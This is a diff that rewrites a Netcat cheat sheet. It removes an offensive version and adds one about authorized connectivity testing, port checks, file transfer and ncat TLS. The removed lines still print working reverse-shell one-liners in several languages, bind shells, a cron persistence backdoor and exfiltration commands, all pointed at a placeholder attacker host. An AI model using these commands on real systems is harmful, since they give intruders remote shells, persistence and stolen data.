@@ -1,553 +1,365 @@
-# Netcat (nc) Cheat Sheet
+# Netcat (`nc`) Cheat Sheet
 
-Netcat is often referred to as the "Swiss Army knife" of networking tools. It can read and write data across network connections using TCP or UDP protocols.
+Netcat is a lightweight command-line tool for reading and writing data over TCP or UDP connections. It is useful for authorized connectivity troubleshooting, service validation, simple data transfer in trusted networks, and protocol testing.
 
-## 📋 Table of Contents
-- [Basic Syntax](#basic-syntax)
-- [Connection Modes](#connection-modes)
-- [Port Scanning](#port-scanning)
-- [File Transfers](#file-transfers)
-- [Banner Grabbing](#banner-grabbing)
-- [Reverse Shells](#reverse-shells)
-- [Bind Shells](#bind-shells)
-- [Port Forwarding](#port-forwarding)
-- [Proxying](#proxying)
-- [Chat Server](#chat-server)
-- [Advanced Techniques](#advanced-techniques)
+> **Use only on systems and networks you own or are explicitly authorized to test.**
+>
+> Traditional `nc` traffic is generally plaintext and unauthenticated. Prefer SSH, TLS-enabled `ncat`, or another authenticated transport for sensitive data.
 
-## Basic Syntax
+## Contents
+
+- [Implementation differences](#implementation-differences)
+- [Quick reference](#quick-reference)
+- [TCP and UDP connectivity](#tcp-and-udp-connectivity)
+- [Listening for connections](#listening-for-connections)
+- [Authorized port checks](#authorized-port-checks)
+- [Protocol and banner testing](#protocol-and-banner-testing)
+- [Trusted file transfers](#trusted-file-transfers)
+- [Ncat for TLS and proxies](#ncat-for-tls-and-proxies)
+- [Troubleshooting](#troubleshooting)
+- [Security guidance](#security-guidance)
+
+## Implementation differences
+
+`nc` is not fully standardized. Check the local manual page before relying on a flag:
 
 ```bash
-nc [options] [target] [port(s)]
+nc -h
+man nc
 ```
 
-Common options:
-- `-l`: Listen mode (server)
-- `-v`: Verbose mode
-- `-vv`: Very verbose
-- `-n`: Numeric-only IP addresses (no DNS)
-- `-p`: Specify source port
-- `-u`: UDP mode (default is TCP)
-- `-w`: Timeout for connects and final net reads
-- `-z`: Zero-I/O mode (scanning)
-- `-e`: Execute program after connection
+Common implementations:
 
-## Connection Modes
+| Implementation | Typical platform | Notes |
+|---|---|---|
+| OpenBSD `nc` | Modern Linux distributions, macOS, BSD | Common and security-conscious implementation; listener syntax is typically `nc -l PORT` |
+| Traditional Netcat | Older Linux systems | May support options absent from OpenBSD `nc`; behavior varies |
+| BusyBox `nc` | Embedded systems and containers | Often has a reduced feature set |
+| Nmap `ncat` | Installed with Nmap or separately | Adds TLS, proxy support, ACLs, broker mode, and other features |
 
-### Client Mode (Connect)
+Avoid assuming that `-e`, `-c`, `-p`, `-q`, or `-k` behaves the same everywhere.
+
+## Quick reference
 
 ```bash
-# Connect to a TCP port
+# TCP connection
 nc example.com 80
 
-# Connect to UDP port
-nc -u example.com 53
+# TCP connection with a 5-second connection/read timeout
+nc -w 5 example.com 443
 
-# Connect with timeout
-nc -w 5 example.com 80
+# Skip DNS resolution and use a numeric address
+nc -n 192.0.2.10 443
 
-# Connect without DNS resolution
-nc -n 192.168.1.1 80
+# UDP connection
+nc -u 198.51.100.53 53
+
+# Listen on TCP port 9000 (OpenBSD nc syntax)
+nc -l 9000
+
+# Verbose listener
+nc -lv 9000
+
+# Check a TCP port without sending application data
+nc -zv -w 3 example.com 443
 ```
 
-### Server Mode (Listen)
+## TCP and UDP connectivity
+
+### Test a TCP service
 
 ```bash
-# Listen on TCP port
-nc -l -p 1234
+# Connect interactively
+nc -v example.com 80
 
-# Listen on TCP port (simplified)
-nc -lvp 1234
+# Connect using a numeric address and timeout
+nc -nv -w 5 192.0.2.10 22
 
-# Listen on UDP port
-nc -u -l -p 1234
-
-# Listen and keep listening after client disconnect
-nc -lk -p 1234
-
-# Listen with verbose output
-nc -lvp 1234
+# Send one line of data to a service
+printf 'hello\n' | nc -w 3 example.com 12345
 ```
 
-## Port Scanning
+### Test a UDP service
 
-### Single Port Scan
+UDP is connectionless, so a successful command does not always prove that a remote application received or processed the datagram.
 
 ```bash
-# Scan single TCP port
-nc -zv example.com 80
+# Send a DNS-like test payload to an authorized UDP listener
+printf 'test\n' | nc -u -w 3 198.51.100.53 9999
 
-# Scan single UDP port
-nc -zuv example.com 53
+# Listen for UDP datagrams
+nc -ul 9999
 ```
 
-### Port Range Scan
+### Specify a source port
+
+Some implementations support `-p` for an explicit local source port in client mode:
 
 ```bash
-# Scan TCP port range
-nc -zv example.com 20-25
-
-# Scan multiple ports
-nc -zv example.com 22 80 443
-
-# Fast scan with timeout
-nc -zvw 1 example.com 1-1000
-
-# Scan UDP ports
-nc -zuv example.com 1-100
+nc -p 40000 example.com 443
 ```
 
-### Banner Grabbing
+Verify local behavior with `man nc`; source-port binding may require elevated privileges for ports below 1024.
+
+## Listening for connections
+
+### Basic TCP listener
 
 ```bash
-# Grab HTTP banner
-echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc example.com 80
-
-# Grab SSH banner
-nc example.com 22
-
-# Grab FTP banner
-nc example.com 21
-
-# Grab SMTP banner
-nc example.com 25
-
-# Grab POP3 banner
-nc example.com 110
+# OpenBSD nc: listen on TCP port 9000
+nc -lv 9000
 ```
 
-## File Transfers
+### Keep a listener available
 
-### Send File
+Some implementations provide `-k` to accept additional connections:
 
 ```bash
-# Receiver (on receiving machine)
-nc -l -p 1234 > received_file.txt
-
-# Sender (on sending machine)
-nc example.com 1234 < file_to_send.txt
-
-# Send with progress using pv
-nc example.com 1234 < file.txt | pv
-
-# Send entire directory (tar + netcat)
-# Receiver
-nc -l -p 1234 | tar xvf -
-# Sender
-tar cvf - /path/to/directory | nc example.com 1234
+nc -lkv 9000
 ```
 
-### Receive File
+If `-k` is unavailable, use a controlled loop for a lab or temporary diagnostic endpoint:
 
 ```bash
-# Server receives file
-nc -l -p 1234 > received.txt
-
-# Client sends file
-cat file.txt | nc example.com 1234
-
-# Send binary file
-nc -l -p 1234 > image.jpg
-# From sender
-nc -w 3 example.com 1234 < image.jpg
-```
-
-## Reverse Shells
-
-A reverse shell is when the target machine connects back to the attacker's machine.
-
-### Basic Reverse Shell
-
-```bash
-# Attacker's machine (listener)
-nc -lvp 4444
-
-# Target machine (victim)
-nc attacker_ip 4444 -e /bin/bash
-
-# Alternative without -e flag
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f
-
-# Using bash
-bash -i >& /dev/tcp/attacker_ip/4444 0>&1
-
-# Using Python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-
-# Using Perl
-perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-### Reverse Shell with TTY
-
-```bash
-# After establishing reverse shell, spawn TTY
-python -c 'import pty;pty.spawn("/bin/bash")'
-
-# Or use script
-script /dev/null
-
-# Background the shell
-Ctrl+Z
-
-# Set terminal to raw mode
-stty raw -echo; fg
-
-# Reset terminal
-reset
-
-# Set terminal type
-export TERM=xterm-256color
-```
-
-## Bind Shells
-
-A bind shell is when the target machine listens on a port and the attacker connects to it.
-
-```bash
-# Target machine (victim) - listens
-nc -lvp 4444 -e /bin/bash
-
-# Attacker connects
-nc victim_ip 4444
-
-# Without -e flag
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l -p 4444 >/tmp/f
-```
-
-## Port Forwarding
-
-### Simple Port Forward
-
-```bash
-# Forward local port 8080 to remote port 80
-mkfifo /tmp/pipe
-nc -l -p 8080 < /tmp/pipe | nc remote_host 80 > /tmp/pipe
-```
-
-### Two-Way Port Forward
-
-```bash
-# Create named pipes
-mkfifo backpipe
-
-# Set up forwarding
-nc -l 8080 0<backpipe | nc remote_host 80 1>backpipe
-```
-
-## Proxying
-
-### HTTP Proxy
-
-```bash
-# Simple HTTP proxy
-while true; do nc -l -p 8080 -c 'nc example.com 80'; done
-
-# SOCKS proxy through netcat relay
-nc -l -p 1080 | nc target 1080
-```
-
-### SSH Tunneling with Netcat
-
-```bash
-# Create SSH tunnel through netcat
-ssh -o "ProxyCommand nc -X connect -x proxy_host:proxy_port %h %p" user@remote_host
-```
-
-## Chat Server
-
-### Simple Chat
-
-```bash
-# Server
-nc -l -p 1234
-
-# Client
-nc server_ip 1234
-
-# Both can now type and send messages
-```
-
-### Multi-Client Chat (One-to-Many)
-
-```bash
-# Server with named pipe
-mkfifo /tmp/chatpipe
-nc -l -p 1234 < /tmp/chatpipe | tee /tmp/chatpipe
-
-# Clients connect
-nc server_ip 1234
-```
-
-## Advanced Techniques
-
-### Web Server
-
-```bash
-# Simple HTTP server
-while true; do nc -l -p 80 -q 1 < index.html; done
-
-# HTTP server with proper headers
-while true; do 
-  echo -e "HTTP/1.1 200 OK\r\n\r\n$(cat index.html)" | nc -l -p 8080 -q 1
+while true; do
+  nc -lv 9000
 done
 ```
 
-### Testing Services
+Do not expose unauthenticated listeners to untrusted networks.
+
+### Receive a one-way message
+
+Receiver:
 
 ```bash
-# Test HTTP server
-echo -e "GET / HTTP/1.0\r\n\r\n" | nc example.com 80
-
-# Test SMTP server
-nc example.com 25
-HELO example.com
-MAIL FROM: <test@example.com>
-RCPT TO: <recipient@example.com>
-DATA
-Subject: Test
-This is a test email.
-.
-QUIT
-
-# Test POP3 server
-nc example.com 110
-USER username
-PASS password
-LIST
-QUIT
-
-# Test FTP server
-nc example.com 21
-USER anonymous
-PASS password
-LIST
-QUIT
+nc -lv 9000 > received-message.txt
 ```
 
-### Remote Command Execution
+Sender:
 
 ```bash
-# Server executes commands
-nc -l -p 1234 -e /bin/bash
-
-# Client sends commands
-nc server_ip 1234
-ls -la
-pwd
-whoami
+printf 'Maintenance test completed.\n' | nc -w 3 192.0.2.20 9000
 ```
 
-### Backdoor
+## Authorized port checks
+
+Use `-z` for zero-I/O connection checks. This is appropriate for inventory validation and authorized troubleshooting, not broad or unauthorized scanning.
 
 ```bash
-# Persistent backdoor (cron job)
-# Add to crontab: */5 * * * * /usr/bin/nc attacker_ip 4444 -e /bin/bash
+# Check one TCP port
+nc -zv -w 3 example.com 443
 
-# Hidden process backdoor
-nohup nc -l -p 4444 -e /bin/bash &
+# Check a limited list of expected service ports
+nc -zv -w 3 example.com 22 80 443
 
-# Backdoor with authentication
-# Create script: auth_backdoor.sh
-#!/bin/bash
-read -p "Password: " pwd
-if [ "$pwd" == "secret123" ]; then
-    /bin/bash
-else
-    exit 1
-fi
-
-# Run it
-nc -l -p 4444 -e ./auth_backdoor.sh
+# Check a small, authorized port range
+nc -zv -w 1 192.0.2.10 8000-8010
 ```
 
-### Network Monitoring
+For UDP:
 
 ```bash
-# Packet capture simulation
-nc -l -p 1234 | tee capture.log
-
-# Network throughput test
-# Server
-nc -l -p 1234 > /dev/null
-# Client
-dd if=/dev/zero bs=1M count=100 | nc server_ip 1234
-
-# Bandwidth test
-# Server
-nc -l -p 1234 | pv > /dev/null
-# Client
-dd if=/dev/zero bs=1M count=1000 | nc server_ip 1234
+nc -zuv -w 3 198.51.100.53 53
 ```
 
-### Data Exfiltration
+Interpret UDP results carefully. Many UDP services do not reply to unexpected data, and filtering can make open, closed, and filtered states difficult to distinguish.
+
+## Protocol and banner testing
+
+### HTTP
+
+Use HTTP/1.1 with a `Host` header:
 
 ```bash
-# Exfiltrate data over HTTP
-# Listener
-nc -l -p 80 > exfiltrated_data.txt
-
-# Sender (looks like web traffic)
-cat sensitive_data.txt | nc target_ip 80
-
-# Exfiltrate over DNS (encoded)
-# Note: This requires more complex setup
-
-# Exfiltrate compressed data
-tar czf - /path/to/data | nc attacker_ip 4444
+printf 'HEAD / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' \
+  | nc -w 5 example.com 80
 ```
 
-### Clipboard Sharing
+For a plain HTTP service on an IP address:
 
 ```bash
-# Send clipboard to remote
-# Receiver
-nc -l -p 1234 | xclip -selection clipboard
-
-# Sender
-xclip -o -selection clipboard | nc target_ip 1234
+printf 'GET /health HTTP/1.1\r\nHost: app.example.com\r\nConnection: close\r\n\r\n' \
+  | nc -w 5 192.0.2.10 8080
 ```
 
-### Remote Desktop Streaming
+For HTTPS, use `curl` or `openssl s_client`; ordinary `nc` does not negotiate TLS.
+
+### SMTP greeting
 
 ```bash
-# Stream desktop (requires ffmpeg)
-# Server
-ffmpeg -f x11grab -video_size 1920x1080 -i :0.0 -f mpegts - | nc -l -p 1234
-
-# Client
-nc server_ip 1234 | ffplay -
+printf 'EHLO client.example.com\r\nQUIT\r\n' \
+  | nc -w 5 mail.example.com 25
 ```
 
-## Ncat (Modern Netcat)
-
-Ncat is the modern reimplementation of netcat from the Nmap project with additional features.
-
-### SSL/TLS Support
+### SSH banner
 
 ```bash
-# SSL server
-ncat -l -p 1234 --ssl
-
-# SSL client
-ncat example.com 1234 --ssl
-
-# SSL with certificate verification
-ncat example.com 1234 --ssl --ssl-verify
+nc -v -w 5 ssh.example.com 22
 ```
 
-### Access Control
+### Redis health check
+
+Only for an authorized instance:
 
 ```bash
-# Allow specific IP
-ncat -l -p 1234 --allow 192.168.1.100
-
-# Deny specific IP
-ncat -l -p 1234 --deny 192.168.1.100
-
-# Allow from file
-ncat -l -p 1234 --allowfile allowed_ips.txt
+printf 'PING\r\n' | nc -w 3 127.0.0.1 6379
 ```
 
-### Proxy Support
+Expected response:
+
+```text
++PONG
+```
+
+### Generic line-oriented protocol test
 
 ```bash
-# Connect through HTTP proxy
-ncat --proxy proxy_host:8080 --proxy-type http example.com 80
-
-# Connect through SOCKS4 proxy
-ncat --proxy proxy_host:1080 --proxy-type socks4 example.com 80
-
-# Connect through SOCKS5 proxy
-ncat --proxy proxy_host:1080 --proxy-type socks5 example.com 80
+printf 'STATUS\r\n' | nc -w 3 192.0.2.30 9000
 ```
 
-### Broker Mode (Multiple Clients)
+## Trusted file transfers
+
+Plain Netcat transfers have no encryption, authentication, resumption, or integrity checking. Use them only in a trusted, controlled environment. Prefer `scp`, `sftp`, `rsync -e ssh`, or a TLS-enabled alternative for real operational transfers.
+
+### Transfer one file
+
+On the receiving system:
 
 ```bash
-# Chat server for multiple clients
-ncat -l -p 1234 --broker
-
-# Clients can all connect and chat
-ncat server_ip 1234
+nc -lv 9000 > received.tar.gz
 ```
 
-## Practical Scenarios
-
-### 1. Network Connectivity Test
+On the sending system:
 
 ```bash
-# Test if port is open
-nc -zv example.com 22
-
-# Test multiple ports
-nc -zv example.com 22 80 443
-
-# Test UDP connectivity
-nc -zuv example.com 53
+nc -w 10 192.0.2.20 9000 < archive.tar.gz
 ```
 
-### 2. Quick File Transfer
+### Verify integrity
+
+Before transfer:
 
 ```bash
-# Send file (receiver first)
-nc -l -p 9999 > received_file.zip
-
-# Then sender
-nc receiver_ip 9999 < file_to_send.zip
+sha256sum archive.tar.gz
 ```
 
-### 3. Remote Backup
+After transfer:
 
 ```bash
-# Backup to remote server
-tar czf - /home/user | nc backup_server 9999
-
-# On backup server
-nc -l -p 9999 | tar xzf -
+sha256sum received.tar.gz
 ```
 
-### 4. Port Forwarding
+Compare the two digests through an authenticated channel.
+
+### Transfer a directory archive
+
+Receiver:
 
 ```bash
-# Forward local 8080 to remote 80
-mkfifo pipe
-nc -l -p 8080 < pipe | nc remote_host 80 > pipe
+nc -lv 9000 > project.tar.gz
 ```
 
-### 5. Simple Port Knocking
+Sender:
 
 ```bash
-# Port knock sequence
-nc -zv target 7000
-nc -zv target 8000
-nc -zv target 9000
-# Now connect to service
-nc target 22
+tar -czf - ./project | nc -w 10 192.0.2.20 9000
 ```
 
-## Security Considerations
+Extract only after validating the received archive:
 
-⚠️ **Important Security Notes:**
+```bash
+tar -tzf project.tar.gz
+tar -xzf project.tar.gz
+```
 
-1. **Netcat is unencrypted** - All data is sent in plaintext
-2. **Use ncat with SSL** for encrypted communications
-3. **Reverse shells bypass firewalls** - Be careful where you use them
-4. **Always have authorization** before using netcat for security testing
-5. **Monitor netcat usage** in production environments
-6. **Disable -e flag** in production systems if possible
+## Ncat for TLS and proxies
 
-## Netcat Alternatives
+[`ncat`](https://nmap.org/ncat/) is the Nmap Project implementation of Netcat. It provides TLS support, proxy support, access controls, and broker mode.
 
-- **Ncat**: Modern netcat with SSL support (part of Nmap)
-- **Socat**: More advanced with bidirectional data transfer
-- **Cryptcat**: Netcat with encryption
-- **Powercat**: PowerShell implementation
-- **Netcat-openbsd**: OpenBSD version with better security
+### TLS client
 
-## Resources
+```bash
+ncat --ssl example.com 443
+```
 
-- [Netcat Manual](http://netcat.sourceforge.net/)
+### TLS client with certificate verification
+
+```bash
+ncat --ssl --ssl-verify example.com 443
+```
+
+For application protocols such as HTTPS, use a protocol-aware tool like `curl` whenever possible.
+
+### TLS listener
+
+Generate and manage certificates according to your organization’s PKI practices. For a temporary lab certificate:
+
+```bash
+ncat -l 9443 --ssl --ssl-cert server.pem --ssl-key server-key.pem
+```
+
+### Connect through a proxy
+
+```bash
+# HTTP CONNECT proxy
+ncat --proxy proxy.example.com:8080 --proxy-type http example.com 443
+
+# SOCKS5 proxy
+ncat --proxy proxy.example.com:1080 --proxy-type socks5 example.com 443
+```
+
+### Restrict a listener
+
+```bash
+ncat -l 9000 --allow 192.0.2.50
+```
+
+Use network firewall rules as the primary control; Ncat allow/deny rules are an additional safeguard.
+
+## Troubleshooting
+
+### Common checks
+
+```bash
+# Confirm the local listener exists
+ss -lntup | grep 9000
+
+# Alternative on systems with net-tools
+netstat -lntup | grep 9000
+
+# Test local connectivity
+nc -zv 127.0.0.1 9000
+
+# Check routing to a remote host
+ip route get 192.0.2.20
+
+# Observe packets during an authorized test
+sudo tcpdump -ni any host 192.0.2.20 and port 9000
+```
+
+### Frequent issues
+
+| Symptom | Likely causes | Useful checks |
+|---|---|---|
+| `Connection refused` | No service is listening, or a local firewall actively rejects the connection | Check the listener with `ss`; validate host firewall rules |
+| Connection times out | Network filtering, routing issue, wrong address, or silent packet drop | Use `ip route get`; capture traffic with `tcpdump`; confirm ACLs and security groups |
+| Listener exits after one client | The local `nc` implementation accepts a single connection by default | Check for `-k`; otherwise use an intentional loop only in a controlled environment |
+| File transfer hangs | One side did not close the connection, timeout is too short, or firewall state expired | Use `-w`; verify both processes and intermediate firewalls |
+| UDP test is inconclusive | UDP has no session establishment and services may not respond | Use an application-aware client or capture packets to confirm delivery |
+
+## Security guidance
+
+- Treat all ordinary `nc` traffic as plaintext. Do not transmit credentials, secrets, personal data, or production backups over it.
+- Bind temporary listeners to a management interface or restrict reachability using host and network firewalls.
+- Use high, non-conflicting ports and remove diagnostic listeners immediately after testing.
+- Prefer protocol-aware tools when available: `curl` for HTTP(S), `openssl s_client` for TLS, `dig` for DNS, and SSH-based tools for remote administration and file transfer.
+- Prefer `ncat --ssl --ssl-verify` or SSH-based transports where confidentiality and endpoint authentication matter.
+- Record scope and authorization for port validation or network testing activities.
+- Avoid using Netcat to execute remote commands, establish shell access, bypass security controls, or maintain persistence.
+
+## References
+
+- [OpenBSD `nc(1)` manual](https://man.openbsd.org/nc)
 - [Ncat User Guide](https://nmap.org/ncat/guide/)
-- [Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
-
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
